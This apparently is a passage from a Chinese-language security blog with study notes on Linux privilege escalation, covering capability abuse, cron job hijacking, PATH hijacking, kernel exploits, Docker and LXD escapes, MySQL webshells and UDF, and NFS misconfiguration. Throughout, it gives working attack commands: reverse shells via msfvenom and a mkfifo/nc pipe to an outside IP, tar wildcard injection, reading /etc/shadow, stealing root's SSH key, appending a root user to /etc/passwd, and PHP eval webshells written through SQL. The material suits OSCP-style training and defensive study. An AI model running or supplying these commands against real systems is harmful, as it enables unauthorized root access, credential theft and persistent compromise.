<h3 id="vim"><a href="#vim" class="headerlink" title="vim"></a>vim</h3><p>需要支持python3模块。<code>vim --version</code>查询，是否支持py3</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim -c <span class="string">&#x27;:py import os; os.setuid(0); os.execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-c&quot;, &quot;reset; exec sh&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="tar"><a href="#tar" class="headerlink" title="tar"></a>tar</h3><p>tar可以使用cap_dac_read_search绕过文件的读权限检查以及目录的读&#x2F;执行权限的检查，来读取敏感信息。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar cvf shadow.tar /etc/shadow  //创建压缩文件tar -xvf shadow.tar  //解压缩cd etc  //进入解压缩的目录chmod +r shadow  //赋予读权限cat shadow | grep root  //查看shadow文件的内容</span><br></pre></td></tr></table></figure>

<p>zip等程序也可以达到相同的目标。</p>
<p>问题：如果给tar设置 cap_setuid 能否使用通配符提权呢？</p>
<blockquote>
<p>结果：好的，不行</p>
</blockquote>
<h3 id="openssl"><a href="#openssl" class="headerlink" title="openssl"></a>openssl</h3><p>当openssl的Capabilities为空时。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">//使用openssl生成证书cd /tmpopenssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes//启动web服务器，监听1337端口cd /python3 -m http.server 8000openssl s_server -key /tmp/key.pem -cert /tmp/cert.pem -port 1337 -HTTP//访问本机的web服务，读取/etc/shadow文件curl -k “https://127.0.0.1:8000/etc/shadow“</span><br></pre></td></tr></table></figure>


<h2 id="cron-jobs-提权"><a href="#cron-jobs-提权" class="headerlink" title="cron jobs 提权"></a>cron jobs 提权</h2><p>cron daemon是它可以安排在特定时间，做特定工作。<br>如果你不了解crontab，你可以看看<a target="_blank" rel="noopener" href="https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&cad=rja&uact=8&ved=2ahUKEwjOitqzkuXoAhWHUN4KHcQEA4oQFjAAegQIARAB&url=http://cn.linux.vbird.org/linux_basic/0430cron.php&usg=AOvVaw0Eocer1SxnUTJnLF6i1fdp">这里</a><br>总而言之，crontab可以安排工作。而它的格式如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># * * * * * user command1 0 24 * * * root touch /root/hello.txt</span><br></pre></td></tr></table></figure>

<p>ID 分 时 日 月 周 用户 命令<br>一个星号代表一个数，而数则表示时间。<br>表示每天的24点整，root用户在家目录中创建一个hello.txt的文件</p>
<h3 id="cron-日志"><a href="#cron-日志" class="headerlink" title="cron 日志"></a>cron 日志</h3><p>Cenots</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /var/log/cron.log|grep <span class="string">&quot;CRON&quot;</span></span><br></pre></td></tr></table></figure>

<p>Ubunt&#x2F;Debian</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /var/log/syslog|grep <span class="string">&quot;CRON&quot;</span></span><br></pre></td></tr></table></figure>

<h3 id="cron-jobs-文件权限（文件重写）"><a href="#cron-jobs-文件权限（文件重写）" class="headerlink" title="cron jobs 文件权限（文件重写）"></a>cron jobs 文件权限（文件重写）</h3><p>而如果你刚好看到排程中，有一个以root用户执行的脚本，而恰好那个脚本可以让普通用户写入。<br>那么你可以重写那个脚本，执行你想要的操作(如msfvenom生成的木马)。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_netcat lhost=LOCALIP lport=8888 R</span><br></pre></td></tr></table></figure>

<p>生成一个可以反弹到netcat的shell。R参数是格式控制，剔除bad characters。<br>把msfvenom输出的代码写入你可以写入的脚本就可以了。<br>监听指令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 8888</span><br></pre></td></tr></table></figure>

<p>开启监听端口后，等待工作排程的执行。一旦执行，那你应该会获得一个root的shell了。</p>
<h3 id="cron-jobs环境变量提权"><a href="#cron-jobs环境变量提权" class="headerlink" title="cron jobs环境变量提权"></a>cron jobs环境变量提权</h3><p><strong>只有在crontab有添加用户变量的前提下做</strong></p>
<p>如</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHELL=/bin/shPATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin1 0 24 * * * bash shell.sh</span><br></pre></td></tr></table></figure>


<p>那么此时，我们就可以修改在<code>/home/user</code>下新建一个名为<code>shell.sh</code>的文件，脚本内容可以是直接运行一个shell，也可以直接netcat反向连接给攻击机。<br>新建好之后要给<code>shell.sh</code>添加运行权限。</p>
<h3 id="cron-jobs-通配符提权"><a href="#cron-jobs-通配符提权" class="headerlink" title="cron jobs 通配符提权"></a>cron jobs 通配符提权</h3><p>通配符提权相关文章:</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://www.secpulse.com/archives/72965.html">利用通配符实现Linux本地提权-安全脉搏</a></li>
<li><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/175453.html">如何使用Cron Jobs实现Linux提权</a></li>
<li><a target="_blank" rel="noopener" href="https://www.helpnetsecurity.com/2014/06/27/exploiting-wildcards-on-linux/">Exploiting wildcards on Linux</a></li>
</ul>
<p><code>cat /etc/crontab</code> 内容如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SHELL=/bin/shPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin</span><br><span class="line"></span><br><span class="line">1 0 24 * * * tar cf /home/milesydson/backups/backup.tgz /var/www/html/*</span><br></pre></td></tr></table></figure>

<p>利用方式如下</p>
<figure class="highlight shell"><figcaption><span>payload</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">cd /var/www/html/</span><br><span class="line">echo &quot;&quot; &gt; &quot;--checkpoint-action=exec=sh shell.sh&quot;</span><br><span class="line">echo &quot;&quot; &gt; &quot;--checkpoint=1&quot;</span><br><span class="line">echo &quot;mkfifo /tmp/cflw;nc 10.10.58.45 8888 0 &lt; /tmp/clfw | /bin/sh &gt;/tmp/cflw 2&gt;&amp;1 &quot; &gt; shell.sh</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>但是查看crontab不能只查看&#x2F;etc&#x2F;crontab一个地方，还要看&#x2F;etc&#x2F;cron.*的任务，系统定时任务，看看有没什么能利用的<br><img src="https://images.atsud0.me/images/post/Screenshot_20200623_162209.jpg"></p>
<p>以及使用<code>crontab -l</code>也看下</p>
<h2 id="环境变量提权-劫持环境变量"><a href="#环境变量提权-劫持环境变量" class="headerlink" title="环境变量提权(劫持环境变量)"></a>环境变量提权(劫持环境变量)</h2><p>什么是环境变量？</p>
<blockquote>
<p>PATH is an environmental variable in Linux and Unix-like operating systems which specifies directories that hold executable programs. When the user run any command in the terminal, it searches for executable files with the help of the PATH Variable in response to commands executed by a user.<br>It is very simple to view the Path of the relevant user with help of the command “echo $PATH”.</p>
</blockquote>
<p>PATH是Linux和类似Unix的操作系统中的环境变量，它指定包含可执行程序的目录。 当用户在终端中运行任何命令时，它会响应用户执行的命令，在PATH变量的帮助下搜索可执行文件。</p>
<blockquote>
<p>使用一个环境变量对一个SUID二进制文件进行提权的话，需要有一个前提条件，那就是：系统管理员错误的写了脚本的路径（没有写绝对路径，如果没有写死路径，而是单单使用<code>ls</code>，这样我们就可以去修改系统的环境变量使其执行，我们伪造的文件。达到我们想要的效果。</p>
</blockquote>
<p>如果我们有一个具有SUID的二进制文件，运行它，观察它调用了什么系统进程 如<code>ps</code>，<code>ls</code>等。</p>
<p>假设我们已经有一个具有SUID的二进制文件，而运行它后将会执行<code>ls</code>的程序。我们可以写一个模拟可执行文件<br>格式是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;你想要运行的命令&quot; &gt; 我们模仿的可执行文件</span><br></pre></td></tr></table></figure>

<p>如上文所说，我们有一个可以执行ls的二进制文件，并且它具有SUID位。而我们是要拿到shell，那我们应该这样写</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;/bin/bash&quot; &gt; ls</span><br></pre></td></tr></table></figure>

<p>给生成的文件，添加一个权限</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x ls</span><br></pre></td></tr></table></figure>

<p>最后，添加一个环境变量。我们生成的ls文件所处在的目录</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export PATH=生成的ls文件所再的目录:$PATH如果ls文件在/tmp下就export PATH=/tmp:$PATH</span><br></pre></td></tr></table></figure>

<p>而此时再执行一次那个具有SUID的二进制文件后，你就会发现我们已经拿到root的shell了。</p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/146799#h3-9">利用PATH环境变量进行Linux提权</a></p>
<blockquote>
<p>思考题:如果看到crontab有一个自动执行某个脚本的任务，并且脚本内程序路径并没有被写死。是否能通过改变环境变量的方式去反弹一个shell呢?</p>
</blockquote>
<details>
<summary>答案</summary>
<pre><code>
不能，因为crontab有单独的环境变量，不会被用户的修改的临时变量所影响。
</code></pre>
</details>



<h2 id="内核漏洞提权"><a href="#内核漏洞提权" class="headerlink" title="内核漏洞提权"></a>内核漏洞提权</h2><h3 id="CVE-2021-3493"><a href="#CVE-2021-3493" class="headerlink" title="CVE-2021-3493"></a>CVE-2021-3493</h3><a href="EXP:CVE-2021-3493" title="https:&#x2F;&#x2F;github.com&#x2F;briskets&#x2F;CVE-2021-3493" target=""></a>

<p>影响版本：</p>
<ul>
<li>Ubuntu 20.10</li>
<li>Ubuntu 20.04 LTS</li>
<li>Ubuntu 18.04 LTS</li>
<li>Ubuntu 16.04 LTS</li>
<li>Ubuntu 14.04 ESM</li>
<li>(overlayfs  5.11)</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc exploit.c -o exploitchmod +x exploit./exploit</span><br></pre></td></tr></table></figure>

<h3 id="脏牛提权-CVE-2016-5195"><a href="#脏牛提权-CVE-2016-5195" class="headerlink" title="脏牛提权 CVE-2016-5195"></a>脏牛提权 CVE-2016-5195</h3><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2016-5195" title="" target="">CVE-2016-5195</a>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc dc32.c -o cowroot -pthread</span><br></pre></td></tr></table></figure>

<p>去exploit-db找到利用补丁，编译后运行就可以了。</p>
<h3 id="CVE-2003-0127"><a href="#CVE-2003-0127" class="headerlink" title="CVE-2003-0127"></a>CVE-2003-0127</h3><a href="https://www.exploit-db.com/exploits/3" title="" target="">ptrace&#x2F;kmod</a>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200615_195603.jpg"></p>
<h3 id="CVE-2009-2698"><a href="#CVE-2009-2698" class="headerlink" title="CVE-2009-2698"></a>CVE-2009-2698</h3><p>{ % link “Linux Kernel 2.6 &lt; 2.6.19 (White Box 4 &#x2F; CentOS 4.4&#x2F;4.5 &#x2F; Fedora Core 4&#x2F;5&#x2F;6 x86) - ‘ip_append_data()’ Ring0 Privilege Escalation (1)” “<a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/9542">https://www.exploit-db.com/exploits/9542</a>“ % }</p>
<h3 id="CVE-2010-2959"><a href="#CVE-2010-2959" class="headerlink" title="CVE-2010-2959"></a>CVE-2010-2959</h3><p><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/14814">Linux Kernel &lt; 2.6.36-rc1 (Ubuntu 10.04 &#x2F; 2.6.32) - ‘CAN BCM’ Local Privilege Escalation</a></p>
<p>内核：2.6.32-generic</p>
<p>版本：Ubuntu 10.04</p>
<p>ExpDB ID:14814</p>
<h3 id="CVE-2013-2094"><a href="#CVE-2013-2094" class="headerlink" title="CVE-2013-2094"></a>CVE-2013-2094</h3><p>内核:2.6.38-8-server #42-Ubuntu<br>版本:Ubuntu 11.04<br><a target="_blank" rel="noopener" href="https://www.exploit-db.com/download/26131">CVE-2013-2094</a></p>
<h3 id="CVE-2017-16995"><a href="#CVE-2017-16995" class="headerlink" title="CVE-2017-16995"></a>CVE-2017-16995</h3><p>影响内核</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Debian 9.0 kernel 4.9.0-3-amd64;        Deepin 15.5 kernel 4.9.0-deepin13-amd64;        ElementaryOS 0.4.1 kernel 4.8.0-52-generic;        Fedora 25 kernel 4.8.6-300.fc25.x86_64;        Fedora 26 kernel 4.11.8-300.fc26.x86_64;        Fedora 27 kernel 4.13.9-300.fc27.x86_64;        Gentoo 2.2 kernel 4.5.2-aufs-r;        Linux Mint 17.3 kernel 4.4.0-89-generic;        Linux Mint 18.0 kernel 4.8.0-58-generic;        Linux Mint 18.3 kernel 4.13.0-16-generic;        Mageia 6 kernel 4.9.35-desktop-1.mga6;        Manjero 16.10 kernel 4.4.28-2-MANJARO;        Solus 3 kernel 4.12.7-11.current;        Ubuntu 14.04.1 kernel 4.4.0-89-generic;        Ubuntu 16.04.2 kernel 4.8.0-45-generic;        Ubuntu 16.04.3 kernel 4.10.0-28-generic;        Ubuntu 17.04 kernel 4.10.0-19-generic;        ZorinOS 12.1 kernel 4.8.0-39-generic.</span><br></pre></td></tr></table></figure>

<p>exp</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/45058">msf</a></li>
<li><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/45010">45010(好用！推荐)</a></li>
</ul>
<h3 id="CVE-2010-4170"><a href="#CVE-2010-4170" class="headerlink" title="CVE-2010-4170"></a>CVE-2010-4170</h3><p>内核:linux 2.6.18-194<br>版本:Centos5.5</p>
<p>systemtap漏洞 linux 2.6.18-194内核提权</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">printf &quot;install uprobes /bin/sh&quot; &gt; exploit.conf; MODPROBE_OPTIONS=&quot;-C exploit.conf&quot; staprun -u whatever</span><br></pre></td></tr></table></figure>

<ul>
<li><a target="_blank" rel="noopener" href="https://rhn.redhat.com/errata/RHSA-2010-0894.html">RHEL</a></li>
<li><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/15620">exploit</a></li>
</ul>
<h3 id="CVE-2002-0056"><a href="#CVE-2002-0056" class="headerlink" title="CVE-2002-0056"></a>CVE-2002-0056</h3><p>影响版本</p>
<p>Linux Kernel 2.6.39 &lt; 3.2.2 (x86&#x2F;x64)</p>
<p>测试环境</p>
<p>内核:3.0.0.12-generic</p>
<p>版本：Ubuntu 11.10</p>
<p>Explodb-id:</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/18411">18411</a></li>
<li><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/35161">35161</a></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ gcc -o 18411 18411.c$ ./18411                                                                                                                                                                                        [56/1648]================================          Mempodipper        ==           by zx2c4          ==         Jan 21, 2012        ================================[+] Waiting for transferred fd in parent.[+] Executing child from child fork.[+] Opening parent mem /proc/5163/mem in child.[+] Sending fd 3 to parent.[+] Assigning fd 5 to stderr.[+] Reading su for exit@plt.[+] Resolved exit@plt to 0x8049520.[+] Calculating su padding.[+] Seeking to offset 0x8049514.[+] Executing su with shellcode.# whoamiroot</span><br></pre></td></tr></table></figure>

<p>如果发现只执行到一半就没了，请检查你的获取的shell，该提权需要一个稳定的shell，如SSH。伪终端可以试下。</p>
<h2 id="其他第三方程序"><a href="#其他第三方程序" class="headerlink" title="其他第三方程序"></a>其他第三方程序</h2><h3 id="USBCreator-D-Bus"><a href="#USBCreator-D-Bus" class="headerlink" title="USBCreator D-Bus"></a>USBCreator D-Bus</h3><p>原文:<a target="_blank" rel="noopener" href="https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/">USBCreator D-Bus Privilege Escalation in Ubuntu Desktop</a></p>
<p>译文:<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/181937"> Ubuntu桌面版USBCreator D-Bus权限提升漏洞分析 </a></p>
<p>利用要求：</p>
<ul>
<li>sudo 用户组</li>
</ul>
<p>获取root的id_rsa。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/.ssh/id_rsa /tmp/id_rsa true</span><br></pre></td></tr></table></figure>

<p>如果root id_rsa不存在</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cp /etc/passwd ./</span><br><span class="line">echo &#x27;new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash&#x27; &gt;&gt;./passwd</span><br><span class="line">gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /home/nadav/passwd /etc/passwd true</span><br></pre></td></tr></table></figure>


<h3 id="Docker提权"><a href="#Docker提权" class="headerlink" title="Docker提权"></a>Docker提权</h3><p>如果多用户借助docker共用一台机器的情况下，并且当前用户具有docker组的权限，可以直接运行一个镜像获得镜像里面的root权限，去修改镜像外的&#x2F;etc&#x2F;passwd来提权。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -v /:/mnt --rm -it alpine chroot /mnt shcat /etc/passwd</span><br></pre></td></tr></table></figure>

<p>docker内部的&#x2F;etc&#x2F;passwd和外部的&#x2F;etc&#x2F;passwd一样，所以，可以直接往里面添加个用户。实现提权。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200712_215410.jpg"></p>
<h4 id="Docker-remote-api"><a href="#Docker-remote-api" class="headerlink" title="Docker remote api"></a>Docker remote api</h4><p>如果目标服务器开启了<code>docker api</code> ，但是未做访问控制。那么我就可以通过 <code>docker client</code> 或者 <code>http</code> 直接请求就可以访问这个 API，通过这个接口，我们可以新建容器，甚至是获取宿主机的<code>shell</code>。</p>
<ol>
<li>修改 &#x2F; root&#x2F;.ssh&#x2F;authorized_keys 或 &#x2F;etc&#x2F;passwd等文件</li>
<li>修改 &#x2F; etc&#x2F;crontab 等计划任务文件</li>
</ol>
<h5 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h5><p>暂时没有。。。以后有空填坑</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/-mo-/p/11529387.html">参考</a></p>
<h3 id="LXD容器提权"><a href="#LXD容器提权" class="headerlink" title="LXD容器提权"></a>LXD容器提权</h3><p>LXD是Linux的一个轻量级容器，如果当前用户具有lxd组权限，则可以导入一个镜像，挂载主系统下的磁盘内容。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 攻击机器上执行</span></span><br><span class="line">git <span class="built_in">clone</span>  https://github.com/saghul/lxd-alpine-builder</span><br><span class="line"><span class="built_in">cd</span> lxd-alpine-builder</span><br><span class="line">./build-alpine</span><br><span class="line"></span><br><span class="line"><span class="comment"># 此命令必须以root用户执行，之后会生成一个tar.gz的压缩包。</span></span><br><span class="line"></span><br><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure>



<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">wget http://Your-Vps-IP/alpine-v3.12-x86_64-20200908_2138.tar.gz -O /tmp/alpine-v3.12.tar.gz</span><br><span class="line"></span><br><span class="line">lxc image import ./alpine-v3.12.tar.gz --<span class="built_in">alias</span> alpine-v3.12</span><br><span class="line"></span><br><span class="line">lxc init alpine-v3.12 ignite -c security.privileged=<span class="literal">true</span></span><br><span class="line"></span><br><span class="line">lxc config device add ignite mydevice disk <span class="built_in">source</span>=/ path=/mnt/root recursive=<span class="literal">true</span></span><br><span class="line"></span><br><span class="line">lxc start ignite</span><br><span class="line"></span><br><span class="line">lxc <span class="built_in">exec</span> ignite /bin/sh</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://images.atsud0.me/images/post/image-20200909095740510.png" alt="image-20200909095740510"></p>
<p><img src="https://images.atsud0.me/images/post/image-20200909095753491.png" alt="image-20200909095753491"></p>
<p><img src="https://images.atsud0.me/images/post/image-20200909095818082.png" alt="image-20200909095818082"></p>
<h3 id="Kubernetes-容器"><a href="#Kubernetes-容器" class="headerlink" title="Kubernetes 容器"></a>Kubernetes 容器</h3><p>（（还没实验，先留坑</p>
<h4 id="CVE-2018-1002105"><a href="#CVE-2018-1002105" class="headerlink" title="CVE-2018-1002105"></a>CVE-2018-1002105</h4><h4 id="CVE-2017-1002101"><a href="#CVE-2017-1002101" class="headerlink" title="CVE-2017-1002101"></a>CVE-2017-1002101</h4><h3 id="Mysql提权"><a href="#Mysql提权" class="headerlink" title="Mysql提权"></a>Mysql提权</h3><p>参考文章:</p>
<ul>
<li><a href="https://xz.aliyun.com/t/1491" title="" target="">Mysql提权思路</a></li>
<li><a href="https://wh0ale.github.io/2019/01/06/2019-1-6-Mysql%E6%8F%90%E6%9D%83/" title="" target="">mysql提权</a></li>
<li><a href="https://www.cnblogs.com/jerrylocker/p/10890128.html" title="" target="">MySQL获取webshell的几种方式</a></li>
</ul>
<h4 id="sql注入读取文件without-sqlmap"><a href="#sql注入读取文件without-sqlmap" class="headerlink" title="sql注入读取文件without sqlmap"></a>sql注入读取文件without sqlmap</h4><p>示例： 读取&#x2F;etc&#x2F;passwd。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.56.104/jabcd0cs/ajax_udf.php?q=1&amp;add_value=odm_user%20UNION%20SELECT%201,load_file(0x2f6574632f706173737764),3,4,5,6,7,8,9http://192.168.56.104/jabcd0cs/ajax_udf.php?q=1&amp;add_value=odm_user%20UNION%20SELECT%201,load_file(CHAR(47, 101, 116, 99, 47, 112, 97, 115, 115, 119, 100)),3,4,5,6,7,8,9</span><br></pre></td></tr></table></figure>

<p>读取的文件名要进行转码,转码要求不能带引号</p>
<h4 id="写一句话获得webshell"><a href="#写一句话获得webshell" class="headerlink" title="写一句话获得webshell"></a>写一句话获得webshell</h4><h5 id="secure-file-priv写一句话"><a href="#secure-file-priv写一句话" class="headerlink" title="secure-file-priv写一句话"></a>secure-file-priv写一句话</h5><p>获取webshell的条件也是苛刻，首先</p>
<ul>
<li>GPC关闭</li>
<li>对web目录有写的权限</li>
<li>知道web目录的绝对路径</li>
<li>没有配置secure-file-priv</li>
</ul>
<p>mysql5.7版本 secure-file-priv默认为NULL了</p>
<p>首先查看数据库配置</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &#x27;%secure%&#x27;;+--------------------------+-------+| Variable_name            | Value |+--------------------------+-------+| require_secure_transport | OFF   || secure_auth              | ON    || secure_file_priv         |       |+--------------------------+-------+select &#x27;&lt;?php eval($_POST[admin])?&gt;&#x27; into outfile &#x27;/home/wwwroot/https/shell.php&#x27;</span><br></pre></td></tr></table></figure>

<p>如果<code>outfile</code>函数不能用则可以使用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#x27;&lt;?php eval($_POST[admin])?&gt;&#x27; into dumpfile &#x27;/home/wwwroot/https/shell.php&#x27;</span><br></pre></td></tr></table></figure>

<h5 id="日志写入一句话"><a href="#日志写入一句话" class="headerlink" title="日志写入一句话"></a>日志写入一句话</h5><p>利用要求：</p>
<ul>
<li>管理员权限</li>
<li>知道网站的绝对路径</li>
</ul>
<p>必要选项：</p>
<ul>
<li>general log 指的是日志保存状态，一共有两个值（ON&#x2F;OFF）ON代表开启 OFF代表关闭。</li>
<li>general log file 指的是日志的保存路径。</li>
</ul>
<p>这两个选项能通过在mysql或者是在phpmyadmin中打开。执行一条sql语句便会被记录到日志文件中。所以只要把日志保存的路径和日志文件名设置成网站路径下的php，就可以生成一个文件，并把一句话代入到其中。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set global general_log=&#x27;on&#x27;;set global general_log_file=&#x27;D:/phpstudy/PHPTutorial/WWW/xxx.php&#x27;select &#x27;&lt;?php eval($_POST[a]);?&gt;&#x27;;</span><br></pre></td></tr></table></figure>

<h4 id="UDF"><a href="#UDF" class="headerlink" title="UDF"></a>UDF</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create function sys_exec returns integer soname &#x27;lib_mysqludf_sys.so&#x27;;</span><br></pre></td></tr></table></figure>

<p>如果成功的话,就可以直接利用sys_exec去执行系统的命令.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select sys_exec(&#x27;chmod u+s /bin/bash&#x27;); # 如果执行成功,/bin/bash将会成为suid位文件,普通用户直接bash -p就能获得root权限.</span><br></pre></td></tr></table></figure>

<h3 id="NFS"><a href="#NFS" class="headerlink" title="NFS"></a>NFS</h3><a href="https://whale3070.github.io/oscp/2019/12/06/02-x/" title="" target="">oscp真题解析-NFS</a>

<h4 id="NFS版本漏洞"><a href="#NFS版本漏洞" class="headerlink" title="NFS版本漏洞"></a>NFS版本漏洞</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit nfs | grep -v &#x27;dos&#x27; | grep -v &#x27;windows&#x27;</span><br></pre></td></tr></table></figure>

<h4 id="权限配置不当"><a href="#权限配置不当" class="headerlink" title="权限配置不当"></a>权限配置不当</h4><p>检查机器上的NFS配置</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/exports</span><br></pre></td></tr></table></figure>

<p>如果有<code>no_root_squash</code>这个选项，root用户就会对共享目录拥有至高的权限控制，就像是对本机的目录操作一样。</p>
<ul>
<li>no_root_squash：登入 NFS 主机使用分享目录的使用者，如果是 root 的话，那么对于这个分享的目录来说，他就具有 root 的权限！这个项目『极不安全』，不建议使用  </li>
<li>root_squash：在登入 NFS 主机使用分享之目录的使用者如果是 root 时，那么这个使用者的权限将被压缩成为匿名使用者，通常他的 UID 与 GID 都会变成 nobody 那个系统账号的身份。</li>
</ul>
<p>假设我们的目标机器上面存在这个配置要怎么利用呢？先用其他机器的root用户挂载目标机器上的NFS共享目录，然后用<code>msfvenom</code>生成一个<code>shell</code>在NFS的共享目录上。然后给予suid位权限，完成之后返回到目标机器上面的低权限用户上执行这个程序，就可以获得一个<code>root_shell</code>了。</p>
<p>在攻击机上以root用户操作</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mkdir /tmp/nfsmount -o rw,vers=3 10.10.10.10:/tmp /tmp/nfs</span><br><span class="line"></span><br><span class="line">msfvenom -p linux/x86/exec CMD=&quot;/bin/bash -p&quot; -f elf -o /tmp/nfs/shell.elf</span><br><span class="line"></span><br><span class="line">chmod +xs /tmp/nfs/shell.elf</span><br></pre></td></tr></table></figure>

<p>现在返回目标机上的低权限用户执行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/tmp/shell.elf</span><br></pre></td></tr></table></figure>

<a href="https://www.cesafe.com/html/6866.html" title="" target="">Linux NFS提权 Linux NFS共享权限提升</a>

